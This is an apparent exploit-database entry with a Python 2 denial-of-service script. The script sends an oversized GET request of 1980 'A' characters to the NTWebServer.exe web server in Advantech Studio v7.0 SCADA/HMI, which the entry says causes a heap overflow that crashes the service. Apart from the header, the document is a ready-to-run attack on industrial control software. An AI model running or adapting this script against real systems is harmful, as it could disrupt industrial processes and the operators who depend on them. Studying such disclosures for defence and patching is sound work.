# Exploit Title: Advantech Studio v7.0 SCADA/HMI http service DOS 0-day
# Google Dork: N/A
# Date: 2012-12-03
# Exploit Author: Nin3
# Vendor Homepage: http://advantech.com.tw
# Version: 7.0 Build Number 0501.1111.0402.0000
# Tested on: Windows
# CVE : N/A

'''
Advantech Studio v7.0 SCADA/HMI has a built in web server NTWebServer.exe,

The bug is a heap based overflow on unicode data. because of the nature of the bug
it is not possible to gain code execution in this condition but it would be possible
to issue DOS condition on the webserver.
'''
import argparse
import httplib
  
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d')
    parser.add_argument('-p')
    args = parser.parse_args()
    if args.d == None or args.p == None:
        print "[!]EXAMPLE USAGE: DOS.py -d 127.0.0.1 -p 80 "
        return
  
    httpConn = httplib.HTTPConnection(args.d, int(args.p))   
    httpConn.request('GET', '\x41'*1980)
    

if __name__ == "__main__":
    main()
    
